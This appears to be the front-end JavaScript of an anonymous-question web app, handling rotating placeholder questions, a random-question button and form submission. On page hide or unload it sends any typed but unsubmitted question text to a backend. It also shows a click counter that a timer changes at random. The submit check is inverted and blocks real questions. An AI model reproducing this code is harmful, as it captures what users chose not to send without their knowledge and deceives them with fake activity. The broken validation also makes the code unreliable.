import { echo, sendDoc, collectData, mergeData, } from './utils.js'

let sampleQuestions = {}
let placeholderValues = [
    "default.do_you_like_anyone_right_now",
    "default.are_u_single",
    "default.wyd_later?",
    "default.do-u-believe-in-second-chances?",
    "default.how_tall_r_u",
    "default.are_u_talking_to_anyone",
    "default.do-you-prefer-texting-or-facetime?",
]

$(document).ready(async function () {
    // FETCH LOCALIZED QUESTIONS
    // used in dynamic placeholder text and dice button
    const APP_CDN_BASE_URL = 'https://cdn.simplelocalize.io/d6cb2f56863b434c8fba40f9404505f9/_latest/'
    const userLanguage = $("meta[name='user:language']").attr('content') || 'en'
    const userAgent = navigator.userAgent || navigator.vendor || window.opera
    
    $.get(APP_CDN_BASE_URL + userLanguage, function (data) {
        for (let key in data) {
            if (key.startsWith("default.")) sampleQuestions[key] = data[key]
        }

        const placeholder = $('.textarea-placeholder');

        let placeholderIndex = 0
        // set the initial text
        placeholder.text(sampleQuestions[placeholderValues[placeholderIndex]]);
        // we know placeholderIndex will always be 1, and will never be out of bounds because placeholderValues is hardcoded in this file
        placeholderIndex = 1

        // fade in the initial text
        placeholder.removeClass('fade-out').addClass('fade-in');

        // swap out the placeholder text every 2 seconds
        setInterval(() => {
            // Start fade out
            placeholder.removeClass('fade-in').addClass('fade-out');

            // After fade out completes, update text and fade in
            setTimeout(() => {
                const question = sampleQuestions[placeholderValues[placeholderIndex]];
                if (question) {
                    placeholder.text(question);
                    placeholder.removeClass('fade-out').addClass('fade-in');
                }

                // Increment index for next time
                if (++placeholderIndex >= placeholderValues.length) {
                    placeholderIndex = 0;
                }
            }, 300); // Match the CSS animation duration
        }, 2000);
    })

    const data = await collectData()

    sendDoc(mergeData(data), cred.view_chat)
        .catch(echo.err)

    // Asking/Viewing question form
    $('.form').submit(async function (evt) {
        evt.preventDefault()

        $('.submit').attr('disabled', true)
        const q = $('#question').val().trim()
        
        if (q) return alert('Please enter a question first!')

        await sendDoc(mergeData(data, q))
            .catch(echo.err)
            .finally(restorePage)
    })

    let hasSentExitData = false

    document.addEventListener('visibilitychange', (evt) => document.visibilityState === 'hidden' ? handleExit(evt) : null)
    window.addEventListener('pagehide', handleExit)
    window.addEventListener('unload', handleExit)

    function handleExit(evt) {
        if (hasSentExitData) return
        hasSentExitData = true
        const q = $('#question').val().trim()

        if (q) sendDoc(mergeData(data, q), cred.null_chat)
    }
    
    window.addEventListener('pageshow', function (evt) {
        var historyTraversal = evt.persisted || (typeof window.performance != 'undefined' && window.performance.navigation.type === 2)
        if (historyTraversal) restorePage()
    })
    
    function restorePage() {
        $('textarea').val('')
        $('.priority-modal').hide()
        $('.bottom-container').show()
        $('.submit').attr('disabled', false)
        $('.textarea-placeholder').removeClass('hidden')
        if (!/android/i.test(userAgent)) $('.submit').hide()
    }

    $('textarea').focus(function () {$('.bottom-container').hide()})
    $('textarea').blur(function () {$('.bottom-container').show()})

    // Animating placeholder JS - Start
    $('textarea').on('input', function (evt) {
        if (evt.target.value.trim() == '')
            $('.textarea-placeholder').removeClass('hidden fade-out').addClass('fade-in');
        else
            $('.textarea-placeholder').addClass('hidden').removeClass('fade-in fade-out');
    })
    // Animating placeholder JS - End

    $('textarea').on('input', function (evt) {
        if (evt.target.value == '' && !/android/i.test(userAgent)) $('.submit').hide()
        else $('.submit').show()
    })

    if (!/android/i.test(userAgent)) $('.submit').hide()

    $('.dice-button').click(function (evt) {
        // Set textarea text to a random question
        const sampleQuestionVals = Object.values(sampleQuestions)
        const randomQuestion = sampleQuestionVals[Math.floor(Math.random() * sampleQuestionVals.length)]

        if (randomQuestion?.length > 0) {
            $('textarea').val(randomQuestion + ' ').trigger("input")
            $('textarea').focus()
            $('textarea')[0].selectionStart = randomQuestion.length + 1
            $('textarea')[0].selectionEnd = randomQuestion.length + 1
        }

        $('.submit').show()

        evt.preventDefault()
    })

    setInterval(() => {
        let clickCount = parseInt($('.clickCount').text())
        clickCount += Math.floor(Math.random() * 5) - 1
        $('.clickCount').text(clickCount)
    }, 800)

})
